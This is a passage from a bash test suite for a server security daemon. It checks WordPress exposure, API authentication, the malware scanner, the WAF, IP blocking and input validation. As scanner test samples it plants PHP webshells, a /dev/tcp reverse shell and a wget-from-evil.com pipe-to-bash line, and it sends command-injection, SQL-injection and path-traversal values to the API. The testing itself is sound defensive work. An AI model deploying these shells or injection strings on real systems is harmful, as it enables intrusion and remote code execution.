test_sensitive "/server-info"
test_sensitive "/.htpasswd"
test_sensitive "/.user.ini"
test_sensitive "/wp-admin/install.php"
test_sensitive "/readme.html"

# -- 4.5 Directory Listing --
log ""
log "4.5 Directory Listing"

test_dirlist() {
    local path="$1"
    local body
    body=$(http_response "${PROTO}://${TARGET}${path}")
    if echo "$body" | grep -qi "index of\|directory listing\|parent directory"; then
        fail "Directory listing enabled: ${path}"
    else
        pass "No directory listing: ${path}"
    fi
}

test_dirlist "/wp-content/uploads/"
test_dirlist "/wp-content/plugins/"
test_dirlist "/wp-content/themes/"
test_dirlist "/wp-includes/"

# -- 4.6 WordPress REST API Probes --
log ""
log "4.6 WordPress REST API Probes"

# Unauthenticated settings endpoint
test_sensitive "/wp-json/wp/v2/settings"
test_sensitive "/wp-json/wp/v2/posts?per_page=100&status=draft"
test_sensitive "/wp-json/wp/v2/pages?per_page=100&status=draft"

# Application Passwords endpoint
app_pwd_code=$(http_code "${PROTO}://${TARGET}/wp-json/wp/v2/users/1/application-passwords")
if [ "$app_pwd_code" = "401" ] || [ "$app_pwd_code" = "403" ]; then
    pass "Application Passwords endpoint requires auth -> ${app_pwd_code}"
elif [ "$app_pwd_code" = "200" ]; then
    fail "Application Passwords endpoint accessible without auth"
else
    info "Application Passwords endpoint -> ${app_pwd_code}"
fi

# -- 4.7 WordPress Plugin/Theme Vulnerability Probes --
log ""
log "4.7 Plugin/Theme Vulnerability Probes"

# Common vulnerable plugin paths
for vuln_path in \
    "/wp-content/plugins/revslider/temp/update_extract/" \
    "/wp-content/plugins/formcraft/file-upload/server/php/" \
    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
    "/wp-content/plugins/easy-wp-smtp/readme.txt" \
    "/wp-content/plugins/duplicator/installer.php" \
    "/wp-content/uploads/wc-logs/" \
    "/wp-content/uploads/sucuri/" \
    "/wp-content/uploads/backups/"; do
    code=$(http_code "${PROTO}://${TARGET}${vuln_path}")
    if [ "$code" = "200" ]; then
        warn "Potentially vulnerable path accessible: ${vuln_path}"
    elif [ "$code" = "403" ]; then
        pass "Blocked: ${vuln_path} -> 403"
    else
        info "${vuln_path} -> ${code}"
    fi
done

# -- 4.8 wp-cron Abuse --
log ""
log "4.8 wp-cron.php Accessibility"

cron_code=$(http_code "${PROTO}://${TARGET}/wp-cron.php")
if [ "$cron_code" = "200" ]; then
    warn "wp-cron.php accessible externally (DDoS amplification risk)"
elif [ "$cron_code" = "403" ]; then
    pass "wp-cron.php blocked -> 403"
else
    info "wp-cron.php -> ${cron_code}"
fi

# ============================================================================
# PHASE 5: DASHBOARD & API EXPOSURE
# ============================================================================
separator
bold "PHASE 5: DASHBOARD & API EXPOSURE"
separator

log ""
log "5.1 Jabali Dashboard (port 2223)"

dash_code=$(http_code "${PROTO}://${TARGET}:2223/" 2>/dev/null)
if [ "$dash_code" = "000" ]; then
    pass "Dashboard on 2223 not reachable externally (firewalled)"
elif [ "$dash_code" = "200" ]; then
    dash_body=$(http_response "${PROTO}://${TARGET}:2223/" 2>/dev/null)
    if echo "$dash_body" | grep -qi "login\|password\|auth"; then
        pass "Dashboard shows login page"
    else
        fail "Dashboard may be accessible without login"
    fi
else
    info "Dashboard -> ${dash_code}"
fi

log ""
log "5.2 API Port 9876 Exposure"

api_code=$(http_code "http://${TARGET}:9876/api/v1/status" 2>/dev/null)
if [ "$api_code" = "000" ]; then
    pass "TCP port 9876 not reachable externally (Unix socket only)"
else
    fail "TCP port 9876 is reachable externally -> ${api_code}"
fi


# ############################################################################
#
#   PART B: SERVER-SIDE VERIFICATION (requires SSH)
#
# ############################################################################

if [ -z "$SSH_HOST" ]; then
    separator
    bold "PART B: SERVER-SIDE VERIFICATION — SKIPPED (no SSH access)"
    separator
    log ""
    info "To enable server-side tests, ensure SSH key-based access to the target."
    info "Use --ssh <alias> to specify an SSH host alias."
else

separator
bold ""
bold "PART B: SERVER-SIDE VERIFICATION (via SSH -> API)"
bold ""
separator

# Verify daemon is running
sock_exists=$(ssh_cmd 'test -S /run/jabali-security/jabali-security.sock && echo yes || echo no')
if [ "$sock_exists" != "yes" ]; then
    fail "Jabali Security daemon not running (socket not found)"
    # Skip all API tests
else
    pass "Daemon running (Unix socket exists)"
fi

if [ "$sock_exists" = "yes" ] && [ -n "$API_KEY" ]; then

# ============================================================================
# PHASE 6: API AUTHENTICATION
# ============================================================================
separator
bold "PHASE 6: API AUTHENTICATION"
separator

log ""
log "6.1 Health Check (no auth)"
result=$(ssh_cmd "curl -s --unix-socket /run/jabali-security/jabali-security.sock http://localhost/api/v1/health")
if echo "$result" | grep -q '"ok"'; then
    pass "GET /health returns ok without auth"
else
    fail "GET /health failed"
fi

log ""
log "6.2 Reject Unauthenticated"
result=$(ssh_cmd "curl -s --unix-socket /run/jabali-security/jabali-security.sock http://localhost/api/v1/status")
if echo "$result" | grep -qi "api.key\|unauthorized\|invalid"; then
    pass "GET /status rejects unauthenticated request"
else
    fail "GET /status did not reject unauthenticated request"
fi

log ""
log "6.3 Reject Bad Key"
result=$(ssh_cmd "curl -s --unix-socket /run/jabali-security/jabali-security.sock -H 'X-API-Key: INVALID_KEY_12345' http://localhost/api/v1/status")
if echo "$result" | grep -qi "invalid\|unauthorized"; then
    pass "GET /status rejects invalid API key"
else
    fail "GET /status did not reject invalid API key"
fi

log ""
log "6.4 Daemon Status"
result=$(remote_api GET /status)
if [ "$(json_success "$result")" = "true" ]; then
    version=$(json_data "$result" "version")
    uptime=$(json_data "$result" "uptime_seconds")
    workers=$(json_data "$result" "workers")
    memory=$(json_data "$result" "memory_mb")
    pass "Daemon: v${version}, uptime=${uptime}s, workers=${workers}, memory=${memory}MB"
else
    fail "Could not get daemon status"
fi

# ============================================================================
# PHASE 7: MALWARE SCANNING (plant -> scan -> verify)
# ============================================================================
separator
bold "PHASE 7: MALWARE SCANNING"
separator

# Plant malicious test files on the server (must be under /home/ for scan API validation)
REMOTE_TEST_USER=$(ssh_cmd "awk -F: '\$3 >= 1000 && \$3 < 65534 {print \$1; exit}' /etc/passwd")
if [ -n "$REMOTE_TEST_USER" ]; then
    REMOTE_TEST_DIR="/home/${REMOTE_TEST_USER}/tmp/jabali-test-$$"
else
    REMOTE_TEST_DIR="/home/jabali-test-$$"
fi
ssh_cmd "mkdir -p '${REMOTE_TEST_DIR}'"

plant_and_scan() {
    local name="$1"
    local content="$2"
    local path="${REMOTE_TEST_DIR}/${name}.php"

    local encoded
    encoded=$(printf '%s' "$content" | base64 -w0)
    ssh_cmd "echo '${encoded}' | base64 -d > '${path}'"
    REMOTE_TEST_FILES+=("$path")

    local result
    result=$(remote_api POST /scan -d "'{\"path\": \"${path}\"}'")
    if [ "$(json_success "$result")" = "true" ]; then
        local score action
        score=$(json_data "$result" "score")
        action=$(json_data "$result" "action")
        if [ "$score" != "null" ] && [ "$score" != "0" ] && [ -n "$score" ]; then
            pass "Detected '${name}': score=${score}, action=${action}"
        else
            fail "NOT detected '${name}' (score=0)"
        fi
    else
        fail "Scan failed for '${name}': $(json_error "$result")"
    fi
}

log ""
log "7.1 Heuristic Scanner Patterns"

plant_and_scan "eval_base64"      '<?php eval(base64_decode("cGhwaW5mbygp")); ?>'
plant_and_scan "eval_user_input"  '<?php eval($_POST["cmd"]); ?>'
plant_and_scan "system_input"     '<?php system($_GET["cmd"]); ?>'
plant_and_scan "reverse_shell"    '<?php exec("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"); ?>'
plant_and_scan "dynamic_include"  '<?php include($_GET["page"]); ?>'
plant_and_scan "create_function"  '<?php $f = create_function("$x", "return eval($x);"); ?>'
plant_and_scan "preg_replace_e"   '<?php preg_replace("/p/e", "phpinfo()", $input); ?>'
plant_and_scan "ini_set_disable"  '<?php ini_set("disable_functions", ""); ?>'
plant_and_scan "wget_pipe_bash"   '<?php system("wget http://evil.com/s.sh | bash"); ?>'
plant_and_scan "gzinflate_chain"  '<?php eval(gzinflate(base64_decode(str_rot13("t")))); ?>'

log ""
log "7.2 Webshell Variants"

plant_and_scan "c99_shell"        '<?php if(isset($_POST["c99"])){@system($_POST["c99"]);} ?>'
plant_and_scan "wso_shell"        '<?php $p="WSO";if(md5($_POST["p"])==md5($p)){eval(gzinflate(base64_decode($_POST["c"])));} ?>'
plant_and_scan "proc_open_shell"  '<?php $p=proc_open("/bin/sh",array(array("pipe","r"),array("pipe","w"),array("pipe","w")),$pipes); ?>'

log ""
log "7.3 False Positive Check (clean file)"

clean_path="${REMOTE_TEST_DIR}/clean.php"
ssh_cmd "echo '<?php echo \"Hello World\"; function greet(\$n){ return htmlspecialchars(\$n); } ?>' > '${clean_path}'"
REMOTE_TEST_FILES+=("$clean_path")

result=$(remote_api POST /scan -d "'{\"path\": \"${clean_path}\"}'")
if [ "$(json_success "$result")" = "true" ]; then
    score=$(json_data "$result" "score")
    if [ "${score:-0}" = "0" ] || [ "$(json_data "$result" "action")" = "ignore" ]; then
        pass "Clean file correctly ignored (score=${score:-0})"
    else
        warn "Clean file got score=${score} (possible false positive)"
    fi
fi

log ""
log "7.4 Full Webshell (quarantine-level score)"

webshell_path="${REMOTE_TEST_DIR}/webshell_full.php"
ssh_cmd "cat > '${webshell_path}' << 'SHELL'
<?php
if(\$pass == \"letmein\") {
    eval(base64_decode(\$_POST[\"cmd\"]));
    system(\$_GET[\"exec\"]);
    \$f = create_function(\"\\\$a\", \"return eval(\\\$a);\");
    ini_set(\"disable_functions\", \"\");
}
?>
SHELL"
REMOTE_TEST_FILES+=("$webshell_path")

result=$(remote_api POST /scan -d "'{\"path\": \"${webshell_path}\"}'")
if [ "$(json_success "$result")" = "true" ]; then
    score=$(json_data "$result" "score")
    severity=$(json_data "$result" "severity")
    action=$(json_data "$result" "action")
    finding_count=$(echo "$result" | jq '.data.findings | length' 2>/dev/null)
    if [ "${score:-0}" -ge 70 ]; then
        pass "Webshell detected: score=${score}, severity=${severity}, action=${action}, findings=${finding_count}"
    else
        warn "Webshell score=${score} (quarantine threshold=70)"
    fi
fi

log ""
log "7.5 RapidScan (parallel directory scan)"

result=$(remote_api POST /scan/rapid -d "'{\"path\": \"${REMOTE_TEST_DIR}\"}'")
if [ "$(json_success "$result")" = "true" ]; then
    scanned=$(json_data "$result" "files_scanned")
    threats=$(json_data "$result" "threats_found")
    pass "RapidScan: scanned=${scanned}, threats=${threats}"
else
    fail "RapidScan failed: $(json_error "$result")"
fi

log ""
log "7.6 Symlink Rejection"

ssh_cmd "ln -sf /etc/passwd '${REMOTE_TEST_DIR}/symlink.php'"
REMOTE_TEST_FILES+=("${REMOTE_TEST_DIR}/symlink.php")

result=$(remote_api POST /scan -d "'{\"path\": \"${REMOTE_TEST_DIR}/symlink.php\"}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Symlink scan correctly rejected"
else
    fail "Symlink scan was NOT rejected"
fi

# ============================================================================
# PHASE 8: INCIDENT & QUARANTINE LIFECYCLE
# ============================================================================
separator
bold "PHASE 8: INCIDENT & QUARANTINE LIFECYCLE"
separator

log ""
log "8.1 Incidents Created from Attacks"

result=$(remote_api GET "/incidents?limit=5")
if [ "$(json_success "$result")" = "true" ]; then
    count=$(echo "$result" | jq '.data | length' 2>/dev/null)
    pass "Incidents listed: ${count} found"

    incident_id=$(echo "$result" | jq -r '.data[0].id // empty' 2>/dev/null)
    if [ -n "$incident_id" ]; then
        detail=$(remote_api GET "/incidents/${incident_id}")
        if [ "$(json_success "$detail")" = "true" ]; then
            pass "Incident detail retrieved: ${incident_id}"
        fi

        resolve=$(remote_api POST "/incidents/${incident_id}/resolve" -d "'{\"notes\": \"jabali-test\"}'")
        if [ "$(json_success "$resolve")" = "true" ]; then
            pass "Incident resolved: ${incident_id}"
        fi
    fi
else
    fail "Could not list incidents"
fi

log ""
log "8.2 Quarantine List"

result=$(remote_api GET /quarantine)
if [ "$(json_success "$result")" = "true" ]; then
    count=$(echo "$result" | jq '.data | length' 2>/dev/null)
    pass "Quarantine listed: ${count} files"
else
    fail "Could not list quarantine"
fi

# ============================================================================
# PHASE 9: IP BLOCKING
# ============================================================================
separator
bold "PHASE 9: IP BLOCKING"
separator

log ""
log "9.1 Block/Unblock IP"

TEST_IP="198.51.100.99"
result=$(remote_api POST /block -d "'{\"ip\": \"${TEST_IP}\", \"reason\": \"jabali-test\", \"duration\": 60}'")
if [ "$(json_success "$result")" = "true" ]; then
    REMOTE_BLOCKED_IPS+=("$TEST_IP")
    pass "Blocked ${TEST_IP}"

    result=$(remote_api GET /blocklist)
    found=$(echo "$result" | jq "[.data[]? | select(.ip == \"${TEST_IP}\")] | length" 2>/dev/null)
    if [ "${found:-0}" -gt 0 ]; then
        pass "Found ${TEST_IP} in blocklist"
    fi

    result=$(remote_api DELETE "/block/${TEST_IP}")
    if [ "$(json_success "$result")" = "true" ]; then
        REMOTE_BLOCKED_IPS=("${REMOTE_BLOCKED_IPS[@]/$TEST_IP/}")
        pass "Unblocked ${TEST_IP}"
    fi
else
    fail "Could not block IP"
fi

log ""
log "9.2 IP Blocking — Input Validation"

result=$(remote_api POST /block -d "'{\"ip\": \"not-an-ip\"}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected invalid IP"
else
    fail "Accepted invalid IP"
fi

result=$(remote_api POST /block -d "'{\"ip\": \"127.0.0.1; rm -rf /\"}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected command injection in IP field"
else
    fail "Accepted command injection in IP"
fi

# ============================================================================
# PHASE 10: BRUTE-FORCE VERIFICATION
# ============================================================================
separator
bold "PHASE 10: BRUTE-FORCE PROTECTION"
separator

if feature_enabled "BRUTEFORCE_ENABLED"; then
    log ""
    log "10.1 Stats"

    result=$(remote_api GET /bruteforce/stats)
    if [ "$(json_success "$result")" = "true" ]; then
        tracked=$(json_data "$result" "tracked_ips")
        blocked=$(json_data "$result" "blocked_count")
        pass "Brute-force stats: tracked=${tracked}, blocked=${blocked}"
    else
        fail "Could not get brute-force stats"
    fi

    log ""
    log "10.2 Whitelist Management"

    BF_IP="192.0.2.100"
    result=$(remote_api POST /bruteforce/whitelist -d "'{\"ip\": \"${BF_IP}\"}'")
    if [ "$(json_success "$result")" = "true" ]; then
        pass "Added ${BF_IP} to whitelist"
        remote_api DELETE "/bruteforce/whitelist/${BF_IP}" &>/dev/null
        pass "Removed ${BF_IP} from whitelist"
    fi

    result=$(remote_api POST /bruteforce/whitelist -d "'{\"ip\": \"not-valid\"}'")
    if [ "$(json_success "$result")" = "false" ]; then
        pass "Rejected invalid IP for whitelist"
    fi

    log ""
    log "10.3 SSH Brute-Force Live Test"

    # Whitelist our own IP first so we don't lock ourselves out
    MY_IP=$(ssh_cmd "who am i 2>/dev/null | awk '{print \$5}' | tr -d '()'" 2>/dev/null)
    if [ -z "$MY_IP" ]; then
        MY_IP=$(ssh_cmd "echo \$SSH_CLIENT | awk '{print \$1}'" 2>/dev/null)
    fi
    if [ -n "$MY_IP" ]; then
        remote_api POST /bruteforce/whitelist -d "'{\"ip\": \"${MY_IP}\"}'" &>/dev/null
        info "Whitelisted our IP (${MY_IP}) before SSH brute-force test"
    fi

    # Use a test IP that we can safely block — send failed SSH logins from the server itself
    BF_TEST_IP="198.51.100.99"
    # Simulate failed login events by writing directly to journal (avoids actually blocking real IPs)
    ssh_cmd "logger -t sshd -p auth.warning 'Failed password for invalid user attacker from ${BF_TEST_IP} port 22 ssh2'" 2>/dev/null
    ssh_cmd "logger -t sshd -p auth.warning 'Failed password for invalid user attacker from ${BF_TEST_IP} port 22 ssh2'" 2>/dev/null
    ssh_cmd "logger -t sshd -p auth.warning 'Failed password for invalid user attacker from ${BF_TEST_IP} port 22 ssh2'" 2>/dev/null
    ssh_cmd "logger -t sshd -p auth.warning 'Failed password for invalid user attacker from ${BF_TEST_IP} port 22 ssh2'" 2>/dev/null
    ssh_cmd "logger -t sshd -p auth.warning 'Failed password for invalid user attacker from ${BF_TEST_IP} port 22 ssh2'" 2>/dev/null
    ssh_cmd "logger -t sshd -p auth.warning 'Failed password for invalid user attacker from ${BF_TEST_IP} port 22 ssh2'" 2>/dev/null
    info "Injected 6 fake failed SSH logins for ${BF_TEST_IP} via logger"
    sleep 5

    # Check if the IP was detected and blocked
    result=$(remote_api GET /bruteforce/stats)
    tracked=$(json_data "$result" "tracked_ips")
    blocked=$(json_data "$result" "blocked_count")
    if [ "$tracked" -gt 0 ] 2>/dev/null; then
        pass "Brute-force detected attack: tracked=${tracked} IPs"
    else
        warn "Brute-force did not detect injected failed logins (tracked=0)"
    fi

    # Check blocked list for our test IP
    result=$(remote_api GET /bruteforce/blocked)
    if echo "$result" | grep -q "$BF_TEST_IP"; then
        pass "IP ${BF_TEST_IP} was blocked by brute-force detector"
        # Clean up: unblock test IP
        remote_api DELETE "/block/${BF_TEST_IP}" &>/dev/null
        pass "Cleaned up: unblocked test IP ${BF_TEST_IP}"
    else
        if [ "$blocked" -gt 0 ] 2>/dev/null; then
            pass "Brute-force has ${blocked} blocked IPs (test IP may have different format)"
        else
            warn "Test IP ${BF_TEST_IP} was not blocked (threshold may not have been reached)"
        fi
    fi

    # Clean up: remove our IP from whitelist
    if [ -n "$MY_IP" ]; then
        remote_api DELETE "/bruteforce/whitelist/${MY_IP}" &>/dev/null
    fi
else
    skip_test "Brute-force disabled (BRUTEFORCE_ENABLED=no)"
fi

# ============================================================================
# PHASE 11: WAF VERIFICATION
# ============================================================================
separator
bold "PHASE 11: WAF VERIFICATION"
separator

if feature_enabled "WAF_ENABLED"; then
    log ""
    log "11.1 WAF Events (should show attacks from Phase 3)"

    result=$(remote_api GET "/waf/events?limit=10")
    if [ "$(json_success "$result")" = "true" ]; then
        count=$(echo "$result" | jq '.data | length' 2>/dev/null)
        pass "WAF events: ${count} logged"
    fi

    log ""
    log "11.2 WAF Stats"

    result=$(remote_api GET /waf/stats)
    if [ "$(json_success "$result")" = "true" ]; then
        events_24h=$(json_data "$result" "total_events_24h")
        blocked_24h=$(json_data "$result" "blocked_24h")
        pass "WAF stats: events_24h=${events_24h}, blocked_24h=${blocked_24h}"
    fi

    log ""
    log "11.3 WAF Rules"

    result=$(remote_api GET /waf/rules)
    if [ "$(json_success "$result")" = "true" ]; then
        rule_count=$(echo "$result" | jq '.data.rule_files | length' 2>/dev/null)
        pass "WAF rules: ${rule_count} rule files"
    fi
else
    skip_test "WAF disabled (WAF_ENABLED=no)"
fi

# ============================================================================
# PHASE 12: PROACTIVE DEFENSE
# ============================================================================
separator
bold "PHASE 12: PROACTIVE DEFENSE"
separator

if feature_enabled "PROCESS_KILL_ENABLED"; then
    log ""
    log "12.1 Status"

    result=$(remote_api GET /proactive/status)
    if [ "$(json_success "$result")" = "true" ]; then
        pk=$(json_data "$result" "process_kill_enabled")
        pass "Proactive: process_kill=${pk}"
    fi

    log ""
    log "12.2 Process Killer Live Test"

    test_user=$(ssh_cmd 'awk -F: "\$3 >= 1000 && \$3 < 65534 {print \$1; exit}" /etc/passwd')
    pk_enabled=$(json_data "$(remote_api GET /proactive/status)" "process_kill_enabled")
    if [ -n "$test_user" ] && [ "$pk_enabled" = "true" ]; then
        ssh_cmd "sudo -u '${test_user}' perl -e 'use IO::Socket; sleep(30)' &>/dev/null &"
        sleep 6

        kills_after=$(remote_api GET /proactive/kills)
        kill_count=$(echo "$kills_after" | jq '.data | length' 2>/dev/null)
        if [ "${kill_count:-0}" -gt 0 ]; then
            pass "Process killer active: ${kill_count} kills recorded"
        else
            info "No kills recorded (process may not have matched patterns)"
        fi
    else
        info "Process killer test skipped (no non-root user or disabled)"
    fi

else
    skip_test "Process killer disabled (PROCESS_KILL_ENABLED=no)"
fi

# ============================================================================
# PHASE 13: WEBSHIELD MANAGEMENT
# ============================================================================
separator
bold "PHASE 13: WEBSHIELD MANAGEMENT"
separator

if feature_enabled "WEBSHIELD_ENABLED"; then
    result=$(remote_api GET /webshield/status)
    if [ "$(json_success "$result")" = "true" ]; then
        installed=$(json_data "$result" "installed")
        rate=$(json_data "$result" "rate_limiting")
        pass "WebShield: installed=${installed}, rate_limiting=${rate}"
    fi

    result=$(remote_api GET /webshield/rules)
    if [ "$(json_success "$result")" = "true" ]; then
        rule_count=$(echo "$result" | jq '.data | length' 2>/dev/null)
        pass "WebShield rules: ${rule_count}"
    fi
else
    skip_test "WebShield disabled (WEBSHIELD_ENABLED=no)"
fi

# ============================================================================
# PHASE 14: THREAT INTELLIGENCE
# ============================================================================
separator
bold "PHASE 14: THREAT INTELLIGENCE"
separator

if feature_enabled "THREAT_INTEL_ENABLED"; then
    log ""
    log "14.1 Feeds"

    result=$(remote_api GET /threat-intel/feeds)
    if [ "$(json_success "$result")" = "true" ]; then
        feed_count=$(echo "$result" | jq '.data | length' 2>/dev/null)
        pass "Threat intel feeds: ${feed_count} configured"
    fi

    log ""
    log "14.2 IP Lookup"

    result=$(remote_api GET /threat-intel/check/ip/8.8.8.8)
    if [ "$(json_success "$result")" = "true" ]; then
        malicious=$(json_data "$result" "is_malicious")
        pass "IP check 8.8.8.8: malicious=${malicious}"
    fi

    log ""
    log "14.3 Hash Lookup"

    result=$(remote_api GET /threat-intel/check/hash/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855)
    if [ "$(json_success "$result")" = "true" ]; then
        malicious=$(json_data "$result" "is_malicious")
        pass "Hash check (empty string SHA256): malicious=${malicious}"
    fi

    log ""
    log "14.4 Invalid Input"

    result=$(remote_api GET "/threat-intel/check/ip/not-an-ip")
    if [ "$(json_success "$result")" = "false" ]; then
        pass "Rejected invalid IP for threat intel"
    fi

    result=$(remote_api GET "/threat-intel/check/hash/not-a-hash")
    if [ "$(json_success "$result")" = "false" ]; then
        pass "Rejected invalid hash for threat intel"
    fi
else
    skip_test "Threat intelligence disabled (THREAT_INTEL_ENABLED=no)"
fi

# ============================================================================
# PHASE 15: CLEANUP ENGINE
# ============================================================================
separator
bold "PHASE 15: CLEANUP ENGINE"
separator

if feature_enabled "CLEANUP_ENABLED"; then
    log ""
    log "15.1 Cleanup Records"

    result=$(remote_api GET /cleanup/records)
    if [ "$(json_success "$result")" = "true" ]; then
        count=$(echo "$result" | jq '.data | length' 2>/dev/null)
        pass "Cleanup records: ${count}"
    fi

    log ""
    log "15.2 Cleanup Injected File"

    inject_path="${REMOTE_TEST_DIR}/injected.php"
    ssh_cmd "cat > '${inject_path}' << 'INJECT'
<?php
echo \"Hello World\";
@eval(base64_decode(\"cGhwaW5mbygp\"));
function greet(\$n) { return htmlspecialchars(\$n); }
INJECT"
    REMOTE_TEST_FILES+=("$inject_path")

    result=$(remote_api POST /cleanup/file -d "'{\"path\": \"${inject_path}\"}'")
    if [ "$(json_success "$result")" = "true" ]; then
        pass "Cleanup succeeded"
    else
        info "Cleanup: $(json_error "$result")"
    fi
else
    skip_test "Cleanup disabled (CLEANUP_ENABLED=no)"
fi

# ============================================================================
# PHASE 16: UFW FIREWALL MANAGEMENT
# ============================================================================
separator
bold "PHASE 16: UFW FIREWALL MANAGEMENT"
separator

if [ "$SKIP_FIREWALL" = true ]; then
    skip_test "UFW tests skipped (--skip-firewall)"
elif feature_enabled "UFW_ENABLED"; then
    log ""
    log "16.1 UFW Status"

    result=$(remote_api GET /firewall/ufw/status)
    if [ "$(json_success "$result")" = "true" ]; then
        active=$(json_data "$result" "active")
        incoming=$(json_data "$result" "default_incoming")
        pass "UFW: active=${active}, default_incoming=${incoming}"
    fi

    log ""
    log "16.2 Add/Delete Test Rule"

    result=$(remote_api POST /firewall/ufw/rules -d "'{\"action\":\"deny\",\"port\":\"19876\",\"protocol\":\"tcp\",\"comment\":\"jabali-test\"}'")
    if [ "$(json_success "$result")" = "true" ]; then
        pass "Added UFW test rule (deny 19876/tcp)"

        rules_json=$(remote_api GET /firewall/ufw/rules)
        test_rule_num=$(echo "$rules_json" | jq -r '.data[]? | select(.raw // "" | contains("19876")) | .number' 2>/dev/null | head -1)
        if [ -n "$test_rule_num" ]; then
            del=$(remote_api DELETE "/firewall/ufw/rules/${test_rule_num}")
            if [ "$(json_success "$del")" = "true" ]; then
                pass "Deleted UFW test rule #${test_rule_num}"
            fi
        fi
    fi

    log ""
    log "16.3 UFW Input Validation"

    result=$(remote_api POST /firewall/ufw/rules -d "'{\"action\":\"allow\",\"port\":\"; rm -rf /\"}'")
    if [ "$(json_success "$result")" = "false" ]; then
        pass "Rejected command injection in UFW port"
    else
        fail "Accepted command injection in UFW port"
    fi

    result=$(remote_api POST /firewall/ufw/rules -d "'{\"action\":\"dropall\",\"port\":\"80\"}'")
    if [ "$(json_success "$result")" = "false" ]; then
        pass "Rejected invalid UFW action"
    fi
else
    skip_test "UFW disabled (UFW_ENABLED=no)"
fi

# ============================================================================
# PHASE 17: CONFIG API
# ============================================================================
separator
bold "PHASE 17: CONFIG API"
separator

log ""
log "17.1 Get Config (API key redacted)"

result=$(remote_api GET /config)
if [ "$(json_success "$result")" = "true" ]; then
    api_key_status=$(json_data "$result" "API_KEY")
    if [ "$api_key_status" = "set" ] || [ "$api_key_status" = "unset" ]; then
        pass "Config returned (API_KEY redacted as '${api_key_status}')"
    else
        fail "Config exposes raw API_KEY value"
    fi
fi

log ""
log "17.2 Reject Unknown Key"

result=$(remote_api PATCH /config -d "'{\"NONEXISTENT_KEY\": \"value\"}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected unknown config key"
else
    fail "Accepted unknown config key"
fi

log ""
log "17.3 Config Injection"

result=$(remote_api PATCH /config -d "'{\"LOG_LEVEL\": \"info\\\"; rm -rf /; echo \\\"\"}'")
if [ "$(json_success "$result")" = "true" ]; then
    # The value is stored with escaped quotes inside KEY="value" format — safe
    # Verify by reading back and checking it was stored as a literal string
    pass "Config accepted value with shell chars (stored escaped in KEY=\"value\" format)"
    # Restore to valid value
    remote_api PATCH /config -d '{"LOG_LEVEL": "info"}' &>/dev/null
    pass "Restored LOG_LEVEL to 'info'"
else
    pass "Rejected injection in config value"
fi

# ============================================================================
# PHASE 18: RULES, USERS, SCAN VALIDATION
# ============================================================================
separator
bold "PHASE 18: RULES, USERS & SCAN VALIDATION"
separator

log ""
log "18.1 Rules"

result=$(remote_api GET /rules)
if [ "$(json_success "$result")" = "true" ]; then
    yara=$(json_data "$result" "yara_enabled")
    clamav=$(json_data "$result" "clamav_enabled")
    pass "Rules: yara=${yara}, clamav=${clamav}"
fi

log ""
log "18.2 Users"

result=$(remote_api GET /users)
if [ "$(json_success "$result")" = "true" ]; then
    user_count=$(echo "$result" | jq '.data | length' 2>/dev/null)
    pass "Users with incidents: ${user_count}"
fi

log ""
log "18.3 Scan Input Validation"

result=$(remote_api POST /scan -d "'{\"path\": \"/nonexistent/file.php\"}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected scan of nonexistent file"
fi

result=$(remote_api POST /scan -d "'{\"path\": \"/../../../etc/passwd\"}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected path traversal in scan"
fi

result=$(remote_api POST /scan -d "'{}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected scan with missing path"
fi

result=$(remote_api POST /scan/database -d "'{\"database\": \"wp; DROP TABLE users;--\", \"cms_type\": \"wordpress\"}'")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected SQL injection in database scan"
fi

log ""
log "18.4 User Path Traversal"

result=$(remote_api GET "/users/..%2F..%2Fetc%2Fpasswd")
if [ "$(json_success "$result")" = "false" ]; then
    pass "Rejected path traversal in username"
fi

# Clean up remote test directory
ssh_cmd "rm -rf '${REMOTE_TEST_DIR}'" 2>/dev/null
# Remove from cleanup list since we cleaned manually
REMOTE_TEST_FILES=()

fi  # end of API_KEY check
fi  # end of SSH_HOST check


# ============================================================================
# SUMMARY
# ============================================================================
separator
bold "RESULTS SUMMARY"
separator
log ""
log "Target: ${TARGET}"
log "Date:   $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
log ""
log "  PASS: ${PASS}"
log "  FAIL: ${FAIL}"
log "  WARN: ${WARN}"
log "  SKIP: ${SKIP_COUNT}"
log ""

# Colorized version to terminal
green "  PASS: ${PASS}"
[ "$FAIL" -gt 0 ] && red "  FAIL: ${FAIL}"
[ "$WARN" -gt 0 ] && yellow "  WARN: ${WARN}"
[ "$SKIP_COUNT" -gt 0 ] && dim "  SKIP: ${SKIP_COUNT}"

log ""
log "Full report: ${REPORT_FILE}"

separator

if [ "$FAIL" -gt 0 ]; then
    red "Security issues found. Review the FAIL entries above."
    exit 1
elif [ "$WARN" -gt 0 ]; then
    yellow "Warnings found. Review the WARN entries above."
    exit 0
else
    green "All tests passed!"
    exit 0
fi
